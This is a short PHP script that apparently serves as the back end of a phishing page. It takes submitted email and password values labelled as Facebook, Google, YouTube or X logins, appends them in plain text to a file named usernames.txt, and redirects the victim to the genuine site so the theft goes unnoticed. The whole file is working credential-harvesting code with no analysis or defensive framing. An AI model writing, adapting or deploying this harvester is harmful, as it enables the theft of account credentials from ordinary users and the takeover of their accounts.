<?php
if (isset($_POST['site']) && isset($_POST['email']) && isset($_POST['pass'])) {
    $site = $_POST['site'];
    $email = $_POST['email'];
    $pass = $_POST['pass'];

    if ($site === 'facebook') {
        file_put_contents("usernames.txt", "Facebook Username: $email Pass: $pass\n", FILE_APPEND);
        header('Location: https://m.facebook.com/');
        exit();
    } elseif ($site === 'google') {
        file_put_contents("usernames.txt", "Google Email: $email Pass: $pass\n", FILE_APPEND);
        header('Location: https://accounts.google.com/');
        exit();
    } elseif ($site === 'youtube') {
        file_put_contents("usernames.txt", "YouTube Email: $email Pass: $pass\n", FILE_APPEND);
        header('Location: https://www.youtube.com/');
        exit();
    } elseif ($site === 'x') {
        file_put_contents("usernames.txt", "X.com Username: $email Pass: $pass\n", FILE_APPEND);
        header('Location: https://x.com/login');
        exit();

    } else {
        echo "Invalid site specified!";
        exit();
    }
} else {
    echo "Required data missing!";
    exit();
}
?>
